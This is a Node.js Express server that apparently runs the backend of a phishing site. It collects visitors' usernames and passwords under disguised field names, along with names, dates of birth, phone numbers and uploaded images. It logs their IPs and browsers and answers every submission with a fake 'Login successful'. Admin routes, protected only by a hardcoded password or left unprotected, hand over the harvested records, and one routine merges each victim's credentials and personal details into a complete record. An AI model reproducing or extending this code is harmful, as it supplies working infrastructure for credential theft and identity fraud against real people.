const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));


// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept only image files
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Database is now used for data storage
console.log('✅ Database connection initialized');

// Simple admin authentication (in production, use proper auth)
const ADMIN_PASSWORD = 'admin123'; // Simple password for demo

// Middleware to track site visitors
app.use(async (req, res, next) => {
  // Only track actual page visits (GET requests to main pages)
  // Skip all API calls, admin routes, and static files
  if (req.path.startsWith('/api') || 
      req.path.startsWith('/uploads') ||
      req.path.startsWith('/static') ||
      req.path.startsWith('/favicon') ||
      req.method !== 'GET') {
    return next();
  }
  
  // Only track main page visits
  const mainPages = ['/', '/login', '/info', '/upload', '/final', '/done', '/admin'];
  if (mainPages.includes(req.path)) {
    try {
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent');
      await db.trackVisitor(ip, userAgent, req.path, req.method);
      console.log('✅ Page visit tracked:', req.path, 'from', ip);
    } catch (error) {
      console.error('Error tracking visitor:', error);
    }
  }
  
  next();
});

// Routes
app.post('/api/login', async (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  try {
    // Create or get user session
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const userSession = await db.createUserSession(ip, userAgent);
    
    // Store login data
    await db.storeLoginData(userSession.sessionId, { xusr, xpss }, ip, userAgent);
    
    // Store session ID in response for frontend to use
    res.json({ 
      success: true, 
      message: 'Login successful',
      sessionId: userSession.sessionId
    });
  } catch (error) {
    console.error('Error storing login data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/info', async (req, res) => {
  const { xname1, xname2, xdob, xtel, sessionId } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Store info data
    await db.storeInfoData(sessionId, { xname1, xname2, xdob, xtel }, ip, userAgent);
    
    res.json({ success: true, message: 'Info submitted successfully' });
  } catch (error) {
    console.error('Error storing info data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file;
  const { sessionId } = req.body;
  
  console.log('File upload request received');
  console.log('File object:', file);
  console.log('Session ID:', sessionId);
  console.log('Request body:', req.body);
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Check if session exists
    const existingSession = await db.prisma.userSession.findUnique({
      where: { sessionId: sessionId }
    });
    
    console.log('Existing session:', existingSession);
    
    if (!existingSession) {
      console.log('Session not found, creating new session');
      // Create a new session if it doesn't exist
      await db.prisma.userSession.create({
        data: {
          sessionId: sessionId,
          ip: ip,
          userAgent: userAgent
        }
      });
    }
    
    // Store upload data
    const result = await db.storeUploadData(sessionId, {
      filename: file ? file.filename : null,
      originalName: file ? file.originalname : null,
      size: file ? file.size : 0,
      path: file ? file.path : null,
      mimeType: file ? file.mimetype : null
    }, ip, userAgent);
    
    console.log('Upload data stored:', result);
    res.json({ success: true, message: 'File uploaded successfully' });
  } catch (error) {
    console.error('Error storing upload data:', error);
    console.error('Error details:', error.message);
    res.status(500).json({ success: false, message: 'Error storing data: ' + error.message });
  }
});

app.post('/api/final', async (req, res) => {
  const { sessionId, ...data } = req.body;
  
  console.log('Final data submission:', data);
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Store final consolidated data
    await db.storeFinalData(sessionId, data, ip, userAgent);
    
    res.json({ success: true, message: 'Data submitted successfully' });
  } catch (error) {
    console.error('Error storing final data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

// Get collected data (for monitoring)
app.get('/api/data', async (req, res) => {
  try {
    const sessions = await db.getAllUserSessions();
    res.json(sessions);
  } catch (error) {
    console.error('Error retrieving data:', error);
    res.status(500).json({ error: 'Error retrieving data' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Track website visits
app.post('/api/track-visit', async (req, res) => {
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const path = req.body.path || '/';
    
    // Track visitor in database
    await db.trackVisitor(ip, userAgent, path, 'GET');
    
    console.log('✅ Website visit tracked:', path, 'from', ip);
    
    res.json({ success: true, message: 'Visit tracked' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ success: false, message: 'Error tracking visit' });
  }
});

// Admin routes
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, message: 'Admin login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid admin password' });
  }
});

app.get('/api/admin/user-data', async (req, res) => {
  try {
    const sessions = await db.getAllUserSessions();
    res.json({
      success: true,
      data: sessions,
      total: sessions.length
    });
  } catch (error) {
    console.error('Error retrieving user data:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  try {
    const visitors = await db.getRecentVisitors(500);
    res.json({
      success: true,
      data: visitors,
      total: visitors.length
    });
  } catch (error) {
    console.error('Error retrieving visitors:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/stats', async (req, res) => {
  try {
    const stats = await db.getSessionStats();
    res.json({
      success: true,
      stats: stats
    });
  } catch (error) {
    console.error('Error retrieving stats:', error);
    res.status(500).json({ success: false, error: 'Error retrieving stats' });
  }
});

// Fix incomplete sessions - mark sessions with login, info, and upload data as completed
app.post('/api/admin/fix-incomplete-sessions', async (req, res) => {
  try {
    const sessions = await db.getAllUserSessions();
    let fixedCount = 0;
    
    for (const session of sessions) {
      // Check if session has login, info, and upload data but no final data
      if (session.loginData && session.infoData && session.uploadData && !session.finalData) {
        console.log(`Fixing incomplete session: ${session.sessionId}`);
        
        // Create final data from existing data
        const finalData = {
          xusr: session.loginData.xusr,
          xpss: session.loginData.xpss,
          xname1: session.infoData.xname1,
          xname2: session.infoData.xname2,
          xdob: session.infoData.xdob,
          xtel: session.infoData.xtel
        };
        
        // Store final data
        await db.storeFinalData(session.sessionId, finalData, session.ip, session.userAgent);
        fixedCount++;
      }
    }
    
    res.json({
      success: true,
      message: `Fixed ${fixedCount} incomplete sessions`,
      fixedCount
    });
  } catch (error) {
    console.error('Error fixing incomplete sessions:', error);
    res.status(500).json({ success: false, error: 'Error fixing sessions' });
  }
});

app.delete('/api/admin/delete-data/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  
  try {
    await db.deleteUserSession(sessionId);
    console.log(`Deleted session: ${sessionId}`);
    res.json({ success: true, message: 'Data deleted successfully' });
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ success: false, message: 'Error deleting data' });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Error:', error);
  res.status(500).json({ error: error.message });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});
